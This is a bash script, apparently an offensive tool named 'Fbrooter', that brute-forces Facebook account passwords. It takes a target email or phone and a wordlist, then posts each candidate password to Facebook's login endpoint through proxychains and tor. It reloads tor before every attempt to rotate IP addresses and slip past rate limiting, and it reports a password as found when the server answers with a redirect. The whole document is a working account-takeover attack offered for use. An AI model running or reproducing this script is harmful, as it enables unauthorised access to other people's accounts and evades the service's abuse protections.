#!/bin/bash
clear
green=`tput setaf 2`
reset=`tput sgr0`
bold=$(tput bold)
normal=$(tput sgr0)
banner="\t\t ${bold}_\n\t0${normal}${bold}7${normal}\t[|] ${bold}0${normal}ffensive ${bold}7${normal}ester\n\n"
echo -e ${banner} && echo -e "
Fbrooter - facebook brute force

       ████████
      ████████
     ████                Email or Phone      Password
     ████                █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█  █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█  █▀▀▀▀▀▀▀▀█
      ████████           █                █  █                █  █ Log in █
     ████████            █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█  █▄▄▄▄▄▄▄▄█
     ████         
      ████                                   Forgot account?
     ████
    ████ brooter


"
if [[ $EUID -ne 0 ]]; then
	echo "this script must be run as root" 
	exit 1
fi
if ! [ -f /usr/bin/curl ]; then
	echo "you need to install curl on your machine for use this tool!"
	echo "for install exec command: apt install curl -y"
	exit 1
fi
if ! [ -f /usr/bin/tor ]; then
	echo "you need to install tor on your machine for use this tool!"
	echo "for install exec command: apt install tor -y"
	exit 1
fi
echo -e "\t*email, username or phone"
read email
if [[ $email = "" ]]; then
	echo -e "\tsorry, but set email is too important!\n"
	exit 0
fi
echo -e "\t*select file location: [/root/Desktop/pass.list]"
read wordlist
if [[ $wordlist = "" ]]; then
	echo -e "\tsorry, but select a file location for select wordlist is too important!\n"
	exit 0
fi
if [[ ${wordlist:00:01} = "~" ]]; then
	wordlist=$HOME${wordlist:1}
fi
if ! [ -f $wordlist ]; then
	echo -e "\terror: wrong file location!\n"
	exit 0
fi
echo ""
rm -rf /tmp/fbrooter
service tor start
proxychains curl -L --data-urlencode email="" --data-urlencode pass="" --data-urlencode name="login" "https://www.facebook.com/login.php?login_attempt=1&lwv=110" --cookie-jar /tmp/fbrooter -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" -s -o /dev/null
passlist=($(cat $wordlist))
lastwordnumber=${#passlist[@]}
numbword="0"
while [[ true ]]; do
	service tor reload
	currentword=${passlist[$numbword]}
	error=false
	response=$(echo $(proxychains curl --data-urlencode email="$email" --data-urlencode pass="$currentword" --data-urlencode name="login" "https://www.facebook.com/login.php?login_attempt=1&lwv=110" --cookie /tmp/fbrooter -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" -w "%{http_code}" -s -o /dev/null))


	if [[ $response == "200" ]] || [[ $response == "302" ]]; then
		error=false
	else
		error=true
	fi
	if [ "$error" != true ]; then
		realnumbword=$(let realnumbword=$numbword+1&& echo $realnumbword)
		echo -en "[$realnumbword/${#passlist[@]}] - uname \"$email\" - passwd \"$currentword\" - "
		if [[ $response == "302" ]]; then
			echo -e "successed"
			echo "Password found: ${green}${bold}$currentword${reset}"
			rm -rf /tmp/fbrooter
			break
		else
			echo -e "failed"
		fi
	fi
	let lastwordnumber=$lastwordnumber-1

	if [ "$error" != true ]; then
	let numbword=$numbword+1
	fi
done